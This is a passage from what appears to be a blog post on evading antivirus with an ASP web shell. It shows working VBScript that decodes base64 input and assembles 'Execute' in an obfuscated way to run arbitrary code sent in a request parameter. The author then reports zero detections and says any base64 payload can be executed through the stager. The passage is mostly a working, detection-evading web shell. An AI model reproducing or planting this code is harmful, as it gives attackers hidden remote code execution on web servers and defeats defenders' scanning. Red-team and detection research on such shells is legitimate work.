  Const adt = 2
  Const atdb = 1
  Dim bs
  Set bs = CreateObject("ADODB.Stream")
  bs.Type = atdb
  bs.Open
  bs.Write Binary
  bs.Position = 0
  bs.Type = adt
  bs.CharSet = "us-ascii"
  sbts = bs.ReadText
  Set bs = Nothing
End Function

Function bd6(ByVal vCode)
    Dim oXML, oNode
    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.text = vCode
    bd6 = sbts(oNode.nodeTypedValue)
    Set oNode = Nothing
    Set oXML = Nothing
End Function

dim fg : fg = "Ex"+mom(4)+"cute(bd6(Request(""file"")))"
eval fg
%>
-–>
{% endhighlight %}

And now.. **0** detections.

![post02-14](/images/post02-14.png)

We can use any b64 encoded payload we want and get it executed through our web shell stager:

![post02-15](/images/post02-15.png)

And that's it! 
